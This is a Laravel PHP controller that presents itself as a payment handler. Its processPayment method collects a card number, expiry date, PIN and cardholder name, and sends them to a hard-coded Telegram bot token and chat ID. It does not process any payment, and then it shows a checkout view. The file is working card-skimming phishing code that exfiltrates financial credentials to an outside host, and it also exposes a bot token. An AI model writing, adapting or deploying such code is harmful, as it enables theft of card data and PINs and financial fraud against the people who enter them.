<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;

class PaymentController extends Controller
{
    public function processPayment(Request $request)
    {

        // $form = $request->all();
        // dd($form);
        // استلام البيانات من الفورم
        $data = $request->validate([
            'card-number' => 'required|digits:16',
            'month' => 'required|numeric|min:1|max:12',
            'year' => 'required|numeric|min:' . date('Y'),
            'pin' => 'required|digits_between:4,6',
        ]);

        // إرسال البيانات إلى تيليجرام
        $token = "7732228991:AAE58LjZ9MbfyUiBSH_tMpyvZXcy8DGTDmE";
        $chatId = "6893238803";
        $message = "💳 **New Payment Attempt**\n\n"
                    . "🏦 **Name:** " . $request->name . "\n"
                    . "🔢 **Card Number:** " . $data['card-number'] . "\n"
                    . "📅 **Expiry Date:** " . $data['month'] . "/" . $data['year'] . "\n"
                    . "🔑 **PIN:** " . $data['pin'];

        Http::post("https://api.telegram.org/bot{$token}/sendMessage", [
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'Markdown'
        ]);

        // تحويل البيانات إلى الفيو وعرضها
        return view('fcheckout', ['form' => $request->all()]);
    }
}
